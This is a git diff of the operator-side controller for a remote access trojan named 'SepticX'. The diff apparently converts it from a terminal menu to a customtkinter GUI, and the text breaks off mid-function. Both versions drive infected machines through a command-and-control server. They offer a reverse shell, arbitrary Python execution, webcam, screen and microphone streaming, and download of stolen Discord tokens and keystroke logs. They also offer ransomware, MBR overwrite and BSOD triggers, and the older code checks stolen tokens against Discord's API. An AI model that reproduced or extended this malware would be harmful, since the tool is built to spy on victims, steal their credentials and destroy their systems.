@@ -1,481 +1,716 @@
-import multiprocessing, threading, websocket, requests, pyaudio, base64, json, time, glob, cv2, ssl, os, io
-from websocket import create_connection
-from PIL import Image, ImageTk
+from tkinter import *
 from random import randbytes
-from termcolor import cprint
-import tkinter as tk
-os.system("")
+from PIL import Image, ImageTk
+from colorama import Style, Fore
+from tkinter import filedialog as fd
+from bit import SUPPORTED_CURRENCIES
+from win10toast import ToastNotifier
+from cryptography.fernet import Fernet
+from websocket import create_connection
+import multiprocessing, customtkinter, subprocess, websocket, threading, coincurve, requests, pyaudio, tkinter, shutil, base64, json, fade, time, glob, cv2, ssl, os, io
 
-class colors():
-    BLACK = '\033[30m'
-    RED = '\033[31m'
-    GREEN = '\033[32m'
-    YELLOW = '\033[33m'
-    BLUE = '\033[34m'
-    MAGENTA = '\033[35m'
-    CYAN = '\033[36m'
-    WHITE = '\033[37m'
-    UNDERLINE = '\033[4m'
-    RESET = '\033[0m'
+customtkinter.set_appearance_mode("dark")
+toaster = ToastNotifier()
+        
 
-class Main:
-    def __init__(self):
-      self.computers = None
-      self.columns = 4
-      self.seperate = 10
-      self.indent = " " * int((69/self.columns)-7)
+class Profile(customtkinter.CTkFrame):
+    def __init__(self, master, parent=None, config=None, row=0, rowspan=1, padx=20, pady=20, title=False):
+        super().__init__(master)
 
-      self.uiprint('Enter your server address')
-      self.host = input('> ').replace('https://', '').replace('http://', '').replace('wss://', '').replace('ws://', '').split('/')[0]
+        self.grid(row=row, rowspan=rowspan, column=0, columnspan=15, padx=padx, pady=pady, sticky="nsew")
 
-      self.uiprint('Enter your server key')
-      self.key = input('> ')
+        for i in range(1): # Set 1 rows
+            self.rowconfigure(i, weight= 1)
+        
+        for i in range(7): # Set 7 columns
+            self.columnconfigure(i, weight= 1)
 
-      self.clear()
+        if title:
+            emoji_widget = customtkinter.CTkButton(self, text="Country", fg_color="gray", text_color_disabled="Black", state="disabled", corner_radius=0)
+            emoji_widget.grid(row=0, column=0, sticky="nsew", padx=0, pady=0)
 
-      threading.Thread(target=self.connect).start()
-      self.main()
+            username_widget = customtkinter.CTkButton(self, text="Desktop Username", fg_color="gray", text_color_disabled="Black", state="disabled", corner_radius=0)
+            username_widget.grid(row=0, column=1, columnspan=3, sticky="nsew", padx=0, pady=0)
 
-    def clear(self):
-        if os.name == "nt":
-          os.system("cls")
-        else:
-          os.system("clear")
+            ip_address_widget = customtkinter.CTkButton(self, text="Ip Address", fg_color="gray", text_color_disabled="Black", state="disabled", corner_radius=0)
+            ip_address_widget.grid(row=0, column=4, columnspan=2, sticky="nsew", padx=0, pady=0)
 
-    def uiprint(self, message="", type=None):
-        if type == "error":
-            print(f"{self.indent}[ ", end="")
-            cprint("ERROR", "red", end="")
-            print(" ] ", end="")
-            cprint(message, "red")
-
-        else:
-            print(f"{self.indent}[ ", end="")
-            cprint("CONTROLLER", "green", end="")
-            print(" ] ", end="")
-            cprint(message, "green")
-
-    def connect(self):
-        self.ws = create_connection(f"wss://{self.host}/api/ws/computers", sslopt={"cert_reqs": ssl.CERT_NONE})
-        ws = self.ws
-        ws.send(self.key)
-
-        while True:
-            try:
-                self.computers = json.loads(ws.recv().replace("'", '"'))["computers"]
-            except Exception as e:
-                self.ws = create_connection(f"wss://{self.host}/api/ws/computers")
-                ws = self.ws
-                ws.send(self.key)
-
-    def get_tokens(self):
-        tokens = requests.get(f'https://{self.host}/tokens', data={'key': self.key}).json()
-        return tokens
-
-    def check(self, token):
-        return requests.get('https://discord.com/api/v9/users/@me', headers={'authorization': token}).status_code == 200
-
-    def send_command(self, command, target):
-        self.ws.send(json.dumps({
-            "code": command,
-            "target": target
-        }))
-
-    def get_input(self, choose=True):
-        uiprint = self.uiprint
-        uiprint("Choose a target:")
-        print("", end="\n\n")
-
-        if not self.computers:
-            uiprint("No available targets.", "error")
+            address_widget = customtkinter.CTkButton(self, text="Other", fg_color="gray", text_color_disabled="Black", state="disabled", corner_radius=0)
+            address_widget.grid(row=0, column=6, columnspan=2, sticky="nsew", padx=0, pady=0)
             return
 
-        for count, target in enumerate(self.computers):
-            print(f"{self.indent}[", end="")
-            cprint(str(count+1), "green", end="")
-            print("] ", end="")
-            print(target, end="\n\n")
+        username = config['username']
+        ip_address = config['ip_address']
 
-        if choose:
-            while True:
-                try:
-                    choice = int(input(f"{self.indent}>>"))
-                    return self.computers[choice - 1]
-                except KeyboardInterrupt:
-                    break
+        ipinfo = requests.get(f"https://ipinfo.io/{config['ip_address']}/json").json()
+        response = requests.get(f"https://flagsapi.com/{ipinfo['country']}/flat/64.png")
 
-                except:
-                  uiprint("Invalid option!", "error")
+        img = Image.open(io.BytesIO(response.content))
+        image = customtkinter.CTkImage(dark_image=img, light_image=img)
 
-        else:
-            uiprint("Pres Enter to continue")
-            input(f"{self.indent}>>")
+        emoji_widget = customtkinter.CTkButton(self, text="", image=image, fg_color="White", text_color_disabled="Black", state="disabled", corner_radius=0)
+        emoji_widget.grid(row=0, column=0, padx=0, sticky="nsew")
 
-    class ReverseShell:
-        def __init__(self, computer, host, key):
-            self.key = key
-            self.host = host
-            self.computer = computer
-            self.ws = self.establishConnection()
-            self.start()
+        username_widget = customtkinter.CTkButton(self, text=username, fg_color="White", text_color_disabled="Black", state="disabled", corner_radius=0)
+        username_widget.grid(row=0, column=1, columnspan=3, sticky="nsew", padx=0, pady=0)
+
+        ip_address_widget = customtkinter.CTkButton(self, text=ip_address, fg_color="White", text_color_disabled="Black", state="disabled", corner_radius=0)
+        ip_address_widget.grid(row=0, column=4, columnspan=2, sticky="nsew", padx=0, pady=0)
+
+        address_widget = customtkinter.CTkButton(self, text="More options", command=lambda: Controller(parent, f"{username}|{ip_address}"), corner_radius=0)
+        address_widget.grid(row=0, column=6, columnspan=2, sticky="nsew", padx=0, pady=0)
+
+
+class Controller(customtkinter.CTkFrame):
+    def __init__(self, master, target):
+        super().__init__(None)
+
+        self.grid(row=1, column=0, padx=20, pady=0, sticky="nsew", columnspan=21, rowspan=18)
+        self.server_address = master.server_address
+        self.server_key = master.server_key
+
+        self.master = master
+
+        for i in range(7): # Set 6 rows
+            self.rowconfigure(i, weight= 1)
         
-        def start(self):
-            ws = self.ws
-            while True:
-                try:
-                    command = input('>> ')
-                except KeyboardInterrupt:
-                    break
-                
-                try:
-                    ws.send(command)
-                except Exception as e:
-                    ws = self.establishConnection()
-
-                try:
-                    while True:
-                        recv = ws.recv()
-                        if recv == '\n':
-                            break
-                        print(recv.rstrip('\n'))
-                        
-                except KeyboardInterrupt:
-                    break
-
-                except Exception as e:
-                    ws = self.establishConnection()
-
-                except websocket._exceptions.WebSocketConnectionClosedException:
-                    ws = self.establishConnection()
-                    
-
-        def establishConnection(self):
-            ws = create_connection(f'wss://{self.host}/api/ws/readShell', sslopt={"cert_reqs": ssl.CERT_NONE})
-            ws.send(self.key)
-            ws.send(self.computer)
-            return ws
-
-    class Audio:
-        def __init__(self, target, host, key):
-            self.key = key
-            self.host = host
-            self.Stop = False
-            self.target = target
-            self.ws = self.establishConnection()
-            self.play()
-
-        def play(self):
-            chunk = 1024
-            FORMAT = pyaudio.paInt16
-            CHANNELS = 1
-            RATE = 8000
-            RECORD_SECONDS = 5
-
-            ws = self.ws
-            p = pyaudio.PyAudio()
-
-            stream = p.open(format = FORMAT,
-                channels = CHANNELS,
-                rate = RATE,
-                input = True,
-                output = True,
-                frames_per_buffer = chunk)
-            
-            try:
-                while not self.Stop:
-                    stream.write(base64.b64decode(ws.recv()))
-            except KeyboardInterrupt:
-                return
-                
-            except:
-                ws = self.establishConnection()
-
-        def establishConnection(self):
-            ws = create_connection(f"wss://{self.host}/api/ws/playAudio")
-            ws.send(self.key)
-            ws.send(self.target)
-            return ws
-
-        def stop(self):
-            self.Stop = True
-
-    class Video:
-        def __init__(self, target, option, host, key):
-            self.key = key
-            self.host = host
-            self.target = target
-            self.Stop = False
-
-            if not option:
-                self.endpoint = "showCamera"
-            else:
-                self.endpoint = "showScreen"
-
-            self.ws = self.establishConnection()
-            threading.Thread(target=self.display).start()
-            time.sleep(0.1)
-            self.update()
-
-        def update(self):
-            ws = self.ws
-
-            while not self.Stop:
-
-                panel = self.panel
-
-                try:
-                    recv_data = ws.recv()
-                    data = base64.b64decode(recv_data)
-
-                    f = io.BytesIO(data)
-                    pilimage = Image.open(f)
-                    img = ImageTk.PhotoImage(pilimage)
-                    panel.configure(image=img)
-                    panel.image = img
-                except (KeyboardInterrupt, AttributeError, Exception):
-                    break
-
-        def display(self):
-            window = tk.Tk()
-            window.title("SepticX Client")
-            window.geometry("300x300")
-            window.configure(background='grey')
-
-            self.panel = tk.Label(window)
-            self.panel.pack(side="bottom", fill="both", expand="yes")
-
-            window.mainloop()
-
-        def establishConnection(self):
-            ws = create_connection(f"wss://{self.host}/api/ws/{self.endpoint}")
-            ws.send(self.key)
-            ws.send(self.target)
-            return ws
-
-        def stop(self):
-            self.Stop = True
-
-    def main(self):
-        uiprint = self.uiprint
-        columns = self.columns
-        length = 15
+        for i in range(4): # Set 4 columns
+            self.columnconfigure(i, weight= 1)
 
         options = [
             "Reverse Shell", "Run PY script", "Resend Credentials", 
             "Nuke Discord Tokens", "Update Discord Webhook", "Stream Camera", 
-            "Stream Desktop","Stream Audio", "Stop Streaming Camera",
-            "Stop Streaming Desktop", "Stop Streaming Audio", "Restart Pc", 
+            "Stream Desktop","Stream Audio", "Restart Pc", 
             "Start Ransomware", "Start Trollware", "Stop Trollware", 
             "Start BSOD", "Overwrite MBR", "Show Message Box",
             "Shutdown Pc", "Logged Tokens", "Logged Keystrokes", 
-            "Uninstall Client", "Show Targets"
+            "Uninstall Client"
         ]
 
         commands = [
             None, None, "sendCreds", 
             "nukeTokens", None, "streamCamera", 
-            "streamDesktop", "streamAudio", "stopDesktop", 
-            "stopCamera", "stopAudio", "restart", 
+            "streamDesktop", "streamAudio", "restart", 
             "startRansomware", "Troll", "stopTroll",
             "bsod", "mbr", None, 
             "shutdown", None, None, 
-            "clean", None
+            "clean"
         ]
 
-        while True:
+        btn = customtkinter.CTkButton(self, text="X", fg_color="Red", command=lambda: self.destroy())
+        btn.grid(row=0, column=0, columnspan=4, padx=5, pady=5, sticky="ew")
 
-            print("""
-                  
-                                                                                                  
-                        ██████╗  █████╗ ███████╗██╗  ██╗██████╗  ██████╗  █████╗ ██████╗ ██████╗     
-                        ██╔══██╗██╔══██╗██╔════╝██║  ██║██╔══██╗██╔═══██╗██╔══██╗██╔══██╗██╔══██╗    
-                        ██║  ██║███████║███████╗███████║██████╔╝██║   ██║███████║██████╔╝██║  ██║    
-                        ██║  ██║██╔══██║╚════██║██╔══██║██╔══██╗██║   ██║██╔══██║██╔══██╗██║  ██║    
-                        ██████╔╝██║  ██║███████║██║  ██║██████╔╝╚██████╔╝██║  ██║██║  ██║██████╔╝    
-                        ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝     
-========================================================================================================================
-Ice Bear#0167   |   Ice Bear#0167  |   Ice Bear#0167  |   Ice Bear#0167  |   Ice Bear#0167  |   Ice Bear#0167  |   Ice B
-========================================================================================================================
-                                      """.replace("║", f"{colors.GREEN}║{colors.RESET}").replace("╗", f"{colors.GREEN}╗{colors.RESET}").replace("╚", f"{colors.GREEN}╚{colors.RESET}").replace("╝", f"{colors.GREEN}╝{colors.RESET}").replace("═", f"{colors.GREEN}═{colors.RESET}").replace("╔", f"{colors.GREEN}╔{colors.RESET}").replace("|", f"{colors.GREEN}|{colors.RESET}"))
+        for count, (command, button_name) in enumerate(zip(commands, options)):
 
-            for count, option in enumerate(options):
+            row = (count // 4) + 1
+            column = count % 4
+            columnspan = 1
 
-                if (count % columns) == 0:
-                    print(f"{self.indent}[", end="")
-                    cprint(str(count +1 ), "green", end="")
-                    print("] ", end="")
-                    print(option, end="")
+            if not count:
+                btn = customtkinter.CTkButton(
+                    self, text=button_name, 
+                    command=lambda: Shell(master, target)
+                )
 
-                else:
-                    base = len(options[0])
-                    space = self.seperate - ( ( len(options[count - 1]) + len(str(count) ) - 1) - base)
+                btn.grid(row=row, column=column, columnspan=columnspan, padx=5, pady=5, sticky="nsew")
 
-                    if not count == 0:
-                        print(" " * space, end="")
-                    else:
-                        print("        ", end="")
-
-                    print("[", end="")
-                    cprint(str(count+1), "green", end="")
-                    print("] ", end="")
-                    print(option, end="")
-
-                if (count % columns) == columns - 1:
-                    print("\n")
-                
-            print("\n\n\n", end="")
-
-            try:
-                choice = int(input(f"{self.indent}>>"))
-            except (KeyboardInterrupt, EOFError):
-                uiprint("Exiting...")
-                time.sleep(1)
-                os._exit(0)
-
-            except:
-                uiprint("Invalid option!", "error")
-                time.sleep(1)
-                self.clear()
                 continue
 
-            if choice == 20:
-                tokens = self.get_tokens()
-                if not tokens:
-                    self.uiprint('No available tokens.', 'error')
+            elif count == 1:
+                btn = customtkinter.CTkButton(
+                    self, text=button_name, 
+                    command=lambda command=command: self.send_command(command, target, True)
+                )
 
-                for token in tokens:
-                    print(f"Token: {token}")
-                
-                    if not self.check(token):
-                        uiprint('Invalid Token', 'error')
-                    else:
-                        uiprint('Valid Token!')
-
-                input(">> Press enter to continue")
-                time.sleep(1)
-                self.clear()
+                btn.grid(row=row, column=column, columnspan=columnspan, padx=5, pady=5, sticky="nsew")
                 continue
 
-            elif choice == 21:
-                uiprint('Downloading logs...')
-                download = requests.get(f'https://{self.host}/logs', data={'key': self.key}).content
-                with open('logs.zip', 'wb') as file:
-                    file.write(download)
+            elif count == 4:
+                btn = customtkinter.CTkButton(
+                    self, text=button_name, 
+                    command=lambda: self.get_webhook_input("Enter your new Webhook", target)
+                )
 
-                uiprint("Downloaded logs are in 'logs.zip'")
-                time.sleep(1)
-                self.clear()
+                btn.grid(row=row, column=column, columnspan=columnspan, padx=5, pady=5, sticky="nsew")
                 continue
 
-            elif choice == 23:
-                self.get_input(choose=False)
-                time.sleep(1)
-                self.clear()
+            elif count == 14:
+                btn = customtkinter.CTkButton(
+                    self, text=button_name, 
+                    command=lambda: self.get_message_box(target)
+                )
+
+                btn.grid(row=row, column=column, columnspan=columnspan, padx=5, pady=5, sticky="nsew")
                 continue
 
-            target = self.get_input()
-            command = commands[choice - 1]
+            elif count == 16:
+                btn = customtkinter.CTkButton(
+                    self, text=button_name, 
+                    command=self.download_tokens
+                )
 
-            if not target:
-                time.sleep(1)
-                self.clear()
+                btn.grid(row=row, column=column, columnspan=columnspan, padx=5, pady=5, sticky="nsew")
                 continue
 
-            elif command:
-                self.send_command(command, target)
+            elif count == 17:
+                btn = customtkinter.CTkButton(
+                    self, text=button_name, 
+                    command=self.download_keylogs
+                )
 
-            if choice == 1:
-                try:
-                    self.ReverseShell(target, self.host, self.key)
-                except KeyboardInterrupt:
-                    pass
-                
-                self.clear()
+                btn.grid(row=row, column=column, columnspan=columnspan, padx=5, pady=5, sticky="nsew")
                 continue
 
-            elif choice == 2:
-                while True:
-                    try:
-                        uiprint("Load from file? (Y or N)")
-                        choice = input(f"{self.indent}>>")
-
-                        yes = ['y', 'yes', 'yup', 'yeah']
-
-                        if choice.lower() in yes:
-                            uiprint("Type the filename below:")
-                            filename = input(f"{self.indent}>>")
-                            command = open(filename, "rb").read().decode()
-
-                        else:
-                            uiprint("Type the python command below:")
-                            command = input(f"{self.indent}>>")
-
-                        break
-
-                    except KeyboardInterrupt:
-                        break
-
-                    except Excpetion as e:
-                        print(e)
-                        uiprint("Invalid filename!", "error")
-
-                self.send_command(command, target)
-                uiprint("Sent!")
-                time.sleep(1.2)
-
-            elif choice == 5:
-                uiprint("Enter your webhook below:")
-                print("", end="\n\n")
-                webhook = input(f"{self.indent}>>")
-                command = f"updateWebhook:{webhook}"
-                self.send_command(command, target)
-
-            elif choice == 6:
-                self.Video(target, 0, self.host, self.key)
-                
-            elif choice == 7:
-                self.Video(target, 1, self.host, self.key)
-                
-            elif choice == 8:
-                self.Audio(target, self.host, self.key)
-
-            elif choice == 18:
-                messageboxes = [
-                    "Error",
-                    "Question",
-                    "Warning"
-                ]
-
-                uiprint('Select messagebox type:\n')
-                for count, messagebox in enumerate(messageboxes):
-                    uiprint(f'{count + 1}. {messagebox}')
-
-                while True:
-                    try:
-                        choice = int(input(f"{self.indent}>>")) - 2
-
-                        messageboxes[choice]
-                        break
-
-                    except KeyboardInterrupt:
-                        break
-
-                    except:
-                        uiprint('Invalid option', 'error')
-
-                uiprint('Enter messagebox title:')
-                title = input(f"{self.indent}>>")
-
-                uiprint('Enter messagebox message:')
-                message = input(f"{self.indent}>>")
-
-                self.send_command(f"messageBox:{choice}:{title}:{message}", target)
+            if command:
+                # if row == 5:
+                #     columnspan = 1
+                #     column = 0
                     
-            else:
-                uiprint('Command Sent!')
 
-            time.sleep(1)
-            self.clear()
+                if command == "streamCamera":
+                    btn = customtkinter.CTkButton(
+                        self, text=button_name, 
+                        command=lambda command=command: (self.send_command(command, target), Video(master, target, 0))
+                    )
 
-if __name__ == '__main__':
-    Main()
+                    btn.grid(row=row, column=column, columnspan=columnspan, padx=5, pady=5, sticky="nsew")
+
+                    continue
+
+                elif command == "streamDesktop":
+                    btn = customtkinter.CTkButton(
+                        self, text=button_name, 
+                        command=lambda command=command: (self.send_command(command, target), Video(master, target, 1))
+                    )
+
+                    btn.grid(row=row, column=column, columnspan=columnspan, padx=5, pady=5, sticky="nsew")
+
+                    continue
+
+                elif command == "streamAudio":
+                    btn = customtkinter.CTkButton(
+                        self, text=button_name, 
+                        command=lambda command=command: (self.send_command(command, target), Audio(master, target))
+                    )
+
+                    btn.grid(row=row, column=column, columnspan=columnspan, padx=5, pady=5, sticky="nsew")
+
+                    continue
+
+                btn = customtkinter.CTkButton(self, text=button_name, command=lambda command = command: self.send_command(command, target))
+                btn.grid(row=row, column=column, columnspan=columnspan, padx=5, pady=5, sticky="nsew")
+
+    def send_message_box(self, frame, title, message, target):
+        messagebox = self.messagebox
+        self.send_command(f"messageBox:{messagebox}:{title}:{message}", target)
+
+        tkinter.messagebox.showinfo("SepticX Client", "Successfully sent MessageBox")
+
+        frame.destroy()
+
+    def set_message_box(self, messagebox):
+        self.messagebox = messagebox
+
+    def get_message_box(self, target):
+        cover_frame = customtkinter.CTkFrame(None)
+        cover_frame.grid(row=1, column=0, padx=20, pady=0, sticky="nsew", columnspan=21, rowspan=18)
+
+        for i in range(11): # Set 11 rows
+            cover_frame.rowconfigure(i, weight= 1)
+        
+        for i in range(3): # Set 1 columns
+            cover_frame.columnconfigure(i, weight= 1)
+
+        btn = customtkinter.CTkButton(cover_frame, text="X", fg_color="Red", command=cover_frame.destroy)
+        btn.grid(row=0, column=0, columnspan=3, padx=5, pady=5, sticky="nsew")
+
+        self.messagebox = "Error"
+
+        messageboxes = [
+            "Error",
+            "Question",
+            "Warning"
+        ]
+
+        label = customtkinter.CTkLabel(cover_frame, text="Select a message box type")
+        label.grid(row=2, columnspan=3, pady=20)
+        
+        for count, messagebox in enumerate(messageboxes):
+            pil_image = Image.open(f"assets\\{messagebox}.png")
+            image = customtkinter.CTkImage(dark_image=pil_image, light_image=pil_image)
+
+            btn = customtkinter.CTkButton(cover_frame, text=messagebox, image=image, command=lambda count=count: self.set_message_box(count))
+            btn.grid(row=3, column=count, padx=20, stick="ew")
+
+        title = customtkinter.CTkEntry(cover_frame, placeholder_text="Enter MessageBox Title")
+        title.grid(row=5, column=1, pady=20, stick="nsew")
+
+        message = customtkinter.CTkEntry(cover_frame, placeholder_text="Enter MessageBox Message")
+        message.grid(row=6, column=1, pady=20, stick="nsew")
+
+        submit = customtkinter.CTkButton(cover_frame, text="Send MessageBox", command=lambda: self.send_message_box(cover_frame, title.get(), message.get(), target))
+        submit.grid(row=8, column=1, pady=20, stick="nsew")
+
+    def download_keylogs(self):
+        tkinter.messagebox.showinfo("SepticX Client", "Downloading logs...")
+        download = requests.get(f'https://{self.server_address}/logs', data={'key': self.server_key}).content
+
+        with open('logs.zip', 'wb') as file:
+            file.write(download)
+
+        tkinter.messagebox.showinfo("SepticX Client", "Logs downloaded to logs.zip")
+
+    def download_tokens(self):
+        tkinter.messagebox.showinfo("SepticX Client", "Downloading logs...")
+        tokens = requests.get(f'https://{self.server_address}/tokens', data={'key': self.server_key}).json()
+
+        with open('tokens.txt', 'w+') as file:
+            file.write('\n'.join(tokens))
+
+        tkinter.messagebox.showinfo("SepticX Client", "Tokens downloaded to tokens.txt")
+
+    def update_webhook(self, frame, webhook, target):
+        self.send_command(f"updateWebhook:{webhook}", target)
+        tkinter.messagebox.showinfo("SepticX Client", "Successfully updated webhook")
+        
+        frame.destroy()
+
+    def get_webhook_input(self, query, target):
+        cover_frame = customtkinter.CTkFrame(None)
+        cover_frame.grid(row=1, column=0, padx=20, pady=0, sticky="nsew", columnspan=21, rowspan=18)
+
+        for i in range(11): # Set 11 rows
+            cover_frame.rowconfigure(i, weight= 1)
+        
+        for i in range(11): # Set 11 columns
+            cover_frame.columnconfigure(i, weight= 1)
+
+        btn = customtkinter.CTkButton(cover_frame, text="X", fg_color="Red", command=cover_frame.destroy)
+        btn.grid(row=0, column=0, columnspan=11, padx=5, pady=5, sticky="nsew")
+
+        entry = customtkinter.CTkEntry(cover_frame, placeholder_text=query)
+        entry.grid(row=5, column=3, columnspan=3, sticky="nsew")
+
+        submit = customtkinter.CTkButton(cover_frame, text=query, command=lambda: self.update_webhook(cover_frame, entry.get(), target))
+        submit.grid(row=5, column=6, columnspan=3, sticky="nsew")
+
+    def send_command(self, command, target, file_prompt=False):
+        if file_prompt:
+            filetypes = (
+                ('All files', '*'),
+            )
+
+            filename = fd.askopenfilename(
+                title='Open a file',
+                initialdir='/',
+                filetypes=filetypes
+            )
+
+            if not filename:
+                return
+
+            command = open(filename, 'r+').read()
+
+        ws.send(json.dumps({
+            "code": command,
+            "target": target
+        }))
+
+
+class Video(customtkinter.CTkFrame):
+    def __init__(self, master, target, option=None):
+        super().__init__(None)
+
+        self.server_address = master.server_address
+        self.server_key = master.server_key
+        self.target = target
+        self.ws = master.ws
+
+        if not option:
+            self.endpoint = "showCamera"
+        else:
+            self.endpoint = "showScreen"
+
+        self.grid(row=1, column=0, padx=20, pady=0, sticky="nsew", columnspan=21, rowspan=18)
+
+        btn = customtkinter.CTkButton(self, text="X", fg_color="Red", command=self.kill_proc)
+        btn.grid(row=0, column=0, columnspan=4, padx=5, pady=5, sticky="ew")
+
+        for i in range(11): # Set 11 rows
+            self.rowconfigure(i, weight= 1)
+        
+        for i in range(1): # Set 1 columns
+            self.columnconfigure(i, weight= 1)
+
+        screen = customtkinter.CTkLabel(self, text="")
+        screen.grid(row=1, column=0, rowspan=10, sticky="nsew")
+
+        self.screen = screen
+        threading.Thread(target=self.get_display).start()
+        self.after(0, self.update_display)
+
+    def update_display(self):
+        try:
+            self.image
+        except AttributeError:
+            self.after(50, self.update_display)
+            return
+
+        image = customtkinter.CTkImage(dark_image=self.image, light_image=self.image, size=(1052, 592))
+        self.screen.configure(image=image)
+        self.after(50, self.update_display)
+
+    def get_display(self):
+        while True:
+            try:
+                recv_data = ws.recv()
+                data = base64.b64decode(recv_data)
+            except (websocket.WebSocketException, ValueError, NameError) as e:
+                ws = self.connect()
+                continue
+
+            self.image = Image.open(io.BytesIO(data))
+
+    def connect(self):
+        while True:
+            try:
+                ws = create_connection(f"wss://{self.server_address}/api/ws/{self.endpoint}")
+                ws.send(self.server_key)
+                ws.send(self.target)
+                return ws
+            except websocket.WebSocketException:
+                pass
+
+    def kill_proc(self):
+        command = self.endpoint.replace('show', 'stop').replace('Screen', 'Desktop')
+
+        print(command, self.target)
+        self.ws.send(json.dumps({
+            "code": command,
+            "target": self.target
+        }))
+
+        self.stop = True
+        self.destroy()
+
+
+class Audio(customtkinter.CTkFrame):
+    def __init__(self, master, target):
+        super().__init__(None)
+
+        self.server_address = master.server_address
+        self.server_key = master.server_key
+        self.target = target
+        self.ws = master.ws
+        self.stop = False
+
+        self.grid(row=1, column=0, padx=20, pady=0, sticky="nsew", columnspan=21, rowspan=18)
+
+        btn = customtkinter.CTkButton(self, text="X", fg_color="Red", command=self.kill_proc)
+        btn.grid(row=0, column=0, padx=5, pady=5, sticky="nsew")
+
+        for i in range(11): # Set 11 rows
+            self.rowconfigure(i, weight= 1)
+        
+        for i in range(1): # Set 1 columns
+            self.columnconfigure(i, weight= 1)
+
+        screen = customtkinter.CTkLabel(self, text="Listening to audio...")
+        screen.grid(row=1, column=0, rowspan=10, sticky="nsew")
+
+        self.screen = screen
+        threading.Thread(target=self.play_audio).start()
+
+    def play_audio(self):
+        chunk = 1024
+        FORMAT = pyaudio.paInt16
+        CHANNELS = 1
+        RATE = 8000
+        RECORD_SECONDS = 5
+        p = pyaudio.PyAudio()
+
+        stream = p.open(format = FORMAT,
+            channels = CHANNELS,
+            rate = RATE,
+            input = True,
+            output = True,
+            frames_per_buffer = chunk)
+        
+        while not self.stop:
+            try:
+                stream.write(base64.b64decode(ws.recv()))
+            except:
+                ws = self.connect()
+
+    def connect(self):
+        while True:
+            try:
+                ws = create_connection(f"wss://{self.server_address}/api/ws/playAudio")
+                ws.send(self.server_key)
+                ws.send(self.target)
+                return ws
+            except websocket.WebSocketException:
+                pass
+
+    def kill_proc(self):
+        self.ws.send(json.dumps({
+            "code": "stopAudio",
+            "target": self.target
+        }))
+
+        self.stop = True
+        self.destroy()
+
+
+class Shell(customtkinter.CTkFrame):
+    def __init__(self, master, target):
+        super().__init__(None)
+
+        self.server_address = master.server_address
+        self.server_key = master.server_key
+        self.target = target
+        self.stop = False
+        self.ws = self.connect()
+        self.row = 0
+
+        self.grid(row=1, column=0, padx=20, pady=0, sticky="nsew", columnspan=21, rowspan=18)
+
+        for i in range(11): # Set 1 rows
+            self.rowconfigure(i, weight= 1)
+        
+        for i in range(1): # Set 1 columns
+            self.columnconfigure(i, weight= 1)
+
+        btn = customtkinter.CTkButton(self, text="X", fg_color="Red", command=self.kill_proc)
+        btn.grid(row=0, column=0, columnspan=4, padx=5, pady=5, sticky="ew")
+
+        terminal_frame = customtkinter.CTkScrollableFrame(self)
+        terminal_frame.grid(row=1, column=0, rowspan=10, columnspan=4, sticky="nsew")
+
+        self.terminal_frame = terminal_frame
+
+        entry = customtkinter.CTkEntry(self, placeholder_text="Enter command")
+        entry.grid(row=11, column=0, columnspan=3, padx=5, pady=5, sticky="nsew")
+
+        self.entry = entry
+
+        submit = customtkinter.CTkButton(self, text="Submit", command=lambda: threading.Thread(target=self.run_command).start())
+        submit.grid(row=11, column=3, padx=5, pady=5, sticky="nsew")
+
+        for i in range(11): # Set 11 rows
+            terminal_frame.rowconfigure(i, weight= 1)
+        
+        for i in range(100): # Set 11 columns
+            terminal_frame.columnconfigure(i, weight= 1)
+
+    def kill_proc(self):
+        self.stop = True
+        self.destroy()
+
+    def run_command(self):
+        command = self.entry.get()
+
+        print(command)
+
+        if not command:
+            return
+
+        ws = self.ws
+        
+        while True:
+            try:
+                ws.send(command)
+                break
+            except Exception as e:
+                ws = self.connect()
+
+        terminal = customtkinter.CTkLabel(self.terminal_frame, text=command, justify=LEFT, anchor="w")
+        terminal.grid(row=self.row, column=0, padx=5, pady=0)
+
+        self.row += 1
+        
+        while True:
+            try:
+                recv = ws.recv()
+            except websocket.WebSocketException:
+                ws = self.connect()
+
+            if recv == '\n':
+                break
+
+            print(recv.rstrip('\n'))
+
+            terminal = customtkinter.CTkLabel(self.terminal_frame, text=recv.rstrip('\n'), justify=LEFT, anchor="w")
+            terminal.grid(row=self.row, column=0, padx=5, pady=0)
+
+            self.row += 1
+
+    def connect(self):
+        while True:
+            try:
+                ws = create_connection(f"wss://{self.server_address}/api/ws/readShell")
+                ws.send(self.server_key)
+                ws.send(self.target)
+                self.ws = ws
+                return ws
+            except websocket.WebSocketException:
+                pass
+
+        
+class App(customtkinter.CTk):
+    def __init__(self):
+        os.system('')
+        self.banner()
+
+        super().__init__()
+
+        self.geometry("1100x600")
+        self.computers = []
+
+        for i in range(21): # Set 21 rows
+            self.rowconfigure(i, weight= 1)
+        
+        for i in range(18): # Set 18 columns
+            self.columnconfigure(i, weight= 1)
+
+        pil_image = Image.open("assets\\Title.png")
+        image = customtkinter.CTkImage(dark_image=pil_image, light_image=pil_image, size=(400, 90))
+
+        title = customtkinter.CTkLabel(self, image=image, text="")
+        title.grid(row=0, column=0, columnspan=24, sticky="nsew")
+
+        self.get_address()
+
+    def get_address(self):
+        key_frame = customtkinter.CTkFrame(self)
+        key_frame.grid(row=1, column=6, padx=20, pady=20, sticky="nsew", columnspan=6, rowspan=18)
+        
+        for i in range(17): # Set 17 rows
+            key_frame.rowconfigure(i, weight= 1)
+        
+        for i in range(17): # Set 17 columns
+            key_frame.columnconfigure(i, weight= 1)
+
+        server_address_entry = customtkinter.CTkEntry(key_frame, placeholder_text='Enter Server Address', justify=CENTER)
+        server_address_entry.grid(row=7, column=0, columnspan=17, padx=20, pady=10, sticky="nsew")
+
+        server_key_entry = customtkinter.CTkEntry(key_frame, placeholder_text='Enter Server Key', justify=CENTER)
+        server_key_entry.grid(row=8, column=0, columnspan=17, padx=20, pady=10, sticky="nsew")
+
+        response_label = customtkinter.CTkLabel(key_frame, text="")
+        response_label.grid(row=15, column=4, columnspan=10, padx=0, pady=0, sticky="ew")
+
+        submit = customtkinter.CTkButton(
+            key_frame, text='Submit', 
+            command=lambda: self.connect_to_server(
+                server_address_entry.get(), 
+                server_key_entry.get(), 
+                response_label
+            )
+        )
+        submit.grid(row=14, column=4, columnspan=10, padx=20, pady=20, sticky="ew")
+
+    def connect_to_server(self, server_address, server_key, label):
+        server_address = server_address.replace('https://', '') \
+            .replace('http://', '') \
+            .replace('wss://', '') \
+            .replace('ws://', '') \
